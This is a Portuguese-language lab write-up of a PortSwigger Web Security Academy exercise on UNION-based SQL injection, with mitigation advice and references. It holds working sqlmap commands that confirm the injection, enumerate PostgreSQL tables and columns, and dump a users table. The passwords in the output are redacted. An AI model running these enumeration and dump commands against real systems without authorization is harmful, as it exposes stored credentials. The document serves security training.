# Relatório de Laboratório --- SQL Injection com sqlmap

> **Ambiente:** PortSwigger Web Security Academy\
> **Laboratório:** *SQL injection attack, listing the database contents
> on non-Oracle databases*\
> **Categoria:** Segurança de aplicações web / SQL Injection (SQLi)\
> **Banco identificado:** PostgreSQL\
> **Ferramenta principal:** sqlmap 1.10.6\
> **Status:** Enumeração e extração de dados concluídas no laboratório.
> Confirmar no navegador se o acesso como `administrator` marcou o
> laboratório como resolvido.

## 1. Objetivo

Investigar uma vulnerabilidade de SQL Injection no filtro de categoria
de produtos, identificar o SGBD, enumerar a estrutura relevante do banco
e demonstrar o impacto da exposição de dados de autenticação.

Todo o teste foi realizado no ambiente de treinamento autorizado da
PortSwigger Web Security Academy. Os comandos abaixo devem ser usados
**somente na instância própria do laboratório ou em sistemas para os
quais exista autorização explícita**.

## 2. Escopo e segurança

-   **Aplicação:** instância temporária do laboratório PortSwigger.
-   **Parâmetro testado:** `category` (GET).
-   **Endpoint:** `/filter?category=...`
-   **Instância:** omitida deste relatório porque o identificador é
    temporário.
-   **Dados sensíveis:** credenciais e senhas foram omitidas/redigidas.
    Não publicar senhas, cookies de sessão nem tokens em repositórios
    públicos.

Para repetir o procedimento, copie a URL da instância ativa e defina a
variável abaixo. Substitua o valor de exemplo pela URL completa da sua
instância:

``` bash
export TARGET_URL='https://YOUR-LAB-ID.web-security-academy.net/filter?category=Food+%26+Drink'
```

A variável deve conter a URL completa, incluindo o parâmetro vulnerável.
Não use esse comando contra sites reais sem autorização.

## 3. Ferramentas utilizadas

-   **Kali Linux:** ambiente de execução dos testes.
-   **sqlmap 1.10.6:** automação de testes de SQL Injection e enumeração
    do banco.
-   **curl:** verificação básica de conectividade HTTP (opcional).
-   **Navegador web:** acesso ao laboratório e verificação final do
    desafio.
-   **PortSwigger Web Security Academy:** plataforma de treinamento com
    escopo controlado.

## 4. Metodologia e comandos

### 4.1. Verificar se a instância responde (opcional)

``` bash
curl -I --max-time 15 "$TARGET_URL"
```

Uma resposta HTTP indica que o servidor respondeu à requisição; códigos
como `200`, `302` ou `403` não significam, por si só, que a
vulnerabilidade foi confirmada. Um timeout ou `504 Gateway Timeout` pode
indicar indisponibilidade temporária ou lentidão do laboratório.

### 4.2. Confirmar o ponto de injeção

``` bash
sqlmap -u "$TARGET_URL" -p category --batch --dbms=PostgreSQL --technique=U
```

**Interpretação das opções:**

-   `-u`: URL alvo.
-   `-p category`: limita o teste ao parâmetro `category`.
-   `--batch`: usa respostas padrão para perguntas interativas.
-   `--dbms=PostgreSQL`: informa o SGBD suspeito para orientar os
    testes.
-   `--technique=U`: restringe a execução à técnica UNION.

O sqlmap confirmou o SGBD **PostgreSQL** e reportou uma injeção **UNION
query**, com **duas colunas** na consulta original. Essa informação é
compatível com o requisito de que uma consulta `UNION` precisa retornar
o mesmo número de colunas da consulta original.

> Nota: em uma instância nova, a detecção deve ser confirmada novamente.
> Não assuma que uma sessão salva ou os resultados de outra instância
> são válidos para o novo alvo.

### 4.3. Enumerar tabelas

``` bash
sqlmap -u "$TARGET_URL" -p category --batch --dbms=PostgreSQL --technique=U -D public --tables
```

O resultado mostrou duas tabelas no schema `public`:

  -----------------------------------------------------------------------
  Tabela                              Observação
  ----------------------------------- -----------------------------------
  `products`                          Tabela associada aos produtos

  `users_nzqcgr`                      Tabela que contém os registros de
                                      usuários no laboratório
  -----------------------------------------------------------------------

### 4.4. Enumerar as colunas da tabela de usuários

``` bash
sqlmap -u "$TARGET_URL" -p category --batch --dbms=PostgreSQL --technique=U -D public -T users_nzqcgr --columns
```

O sqlmap identificou estas colunas:

  Coluna              Tipo        Interpretação
  ------------------- ----------- --------------------------
  `email`             `varchar`   Campo de e-mail
  `password_yukacb`   `varchar`   Campo de senha
  `username_ctwebk`   `varchar`   Campo de nome de usuário

Os sufixos dos nomes são específicos desta instância do laboratório. Em
outra instância, os identificadores podem ser diferentes.

### 4.5. Extrair os registros da tabela (somente no laboratório autorizado)

``` bash
sqlmap -u "$TARGET_URL" -p category --batch --dbms=PostgreSQL --technique=U -D public -T users_nzqcgr --dump
```

O comando retornou três registros:

  Nome de usuário   E-mail   Senha
  ----------------- -------- --------------
  `administrator`   `NULL`   `[REDACTED]`
  `wiener`          `NULL`   `[REDACTED]`
  `carlos`          `NULL`   `[REDACTED]`

As senhas foram redigidas neste relatório para evitar a publicação
desnecessária de credenciais. O sqlmap também salvou a saída em CSV
localmente dentro do diretório de saída do alvo. **Não publique esse CSV
sem revisar e remover credenciais, cookies e outros dados sensíveis.**

## 5. Resumo dos resultados

-   Parâmetro vulnerável: `category` (GET).
-   SGBD identificado: PostgreSQL.
-   Técnica confirmada pelo sqlmap: UNION-based SQL Injection.
-   Número de colunas na consulta original: 2.
-   Schema enumerado: `public`.
-   Tabela relevante: `users_nzqcgr`.
-   Colunas relevantes: `username_ctwebk`, `password_yukacb` e `email`.
-   Registros encontrados: 3, incluindo a conta `administrator`.
-   Impacto demonstrado: leitura não autorizada de dados de autenticação
    armazenados na tabela.

## 6. Impacto

Uma SQL Injection explorável pode permitir que um atacante altere a
lógica de uma consulta SQL e acesse dados além daqueles previstos pela
aplicação. Neste exercício, foi possível enumerar a estrutura do banco e
recuperar registros da tabela de usuários, demonstrando risco de
exposição de credenciais e possível comprometimento de contas.

O impacto real em produção depende dos privilégios da conta de banco
usada pela aplicação, da sensibilidade dos dados e dos controles
adicionais existentes.

## 7. Recomendações de mitigação

1.  **Usar consultas parametrizadas (prepared statements):** separar a
    estrutura SQL dos valores recebidos do usuário, evitando concatenar
    diretamente a entrada na consulta.
2.  **Evitar confiar apenas em filtros ou escaping manual:** validação
    de entrada é uma camada complementar, não substitui parametrização.
3.  **Aplicar o princípio do menor privilégio:** a conta da aplicação
    deve ter somente as permissões necessárias e não deve ter
    privilégios administrativos desnecessários.
4.  **Reduzir a exposição de erros:** não retornar mensagens internas do
    banco ao usuário final; registrar detalhes técnicos de forma segura
    no servidor.
5.  **Adicionar testes de segurança:** incluir testes de SQLi no ciclo
    de desenvolvimento e revisar os pontos em que entradas do usuário
    chegam às consultas SQL.
6.  **Tratar credenciais com segurança:** armazenar senhas usando
    algoritmos apropriados de hash de senha com salt, e não em texto
    puro. Se houver suspeita de exposição em produção, invalidar sessões
    e redefinir credenciais afetadas.

## 8. Aprendizados

-   Como restringir o teste a um parâmetro específico com `-p`.
-   Como o sqlmap identifica o SGBD e uma técnica de injeção.
-   Como enumerar tabelas com `--tables`.
-   Como descobrir colunas com `--columns`.
-   Como extrair registros de uma tabela específica com `--dump`.
-   Como documentar evidências sem expor credenciais em um portfólio
    público.
-   Por que consultas parametrizadas e privilégios mínimos são controles
    essenciais contra SQL Injection.

## 9. Limitações

Este relatório descreve uma instância temporária de laboratório e os
resultados observados nela. Os nomes aleatorizados de tabela e coluna
podem mudar quando o laboratório é reiniciado. A confirmação final de
conclusão deve ser feita no navegador, entrando na conta indicada pelo
enunciado e verificando a mensagem de sucesso da plataforma.

## 10. Referências

1.  PortSwigger Web Security Academy --- [SQL injection: examining the
    database](https://portswigger.net/web-security/sql-injection/examining-the-database)
2.  PortSwigger Web Security Academy --- [SQL injection UNION
    attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
3.  PortSwigger Web Security Academy --- [Lab: listing the database
    contents on non-Oracle
    databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
4.  sqlmap Project --- [Usage
    documentation](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
5.  OWASP Cheat Sheet Series --- [SQL Injection Prevention Cheat
    Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet)
6.  OWASP Cheat Sheet Series --- [Query Parameterization Cheat
    Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet)

------------------------------------------------------------------------

**Nota ética:** este relatório documenta uma atividade educacional
autorizada. Faça testes de segurança apenas em sistemas próprios,
laboratórios ou alvos cobertos por autorização explícita.
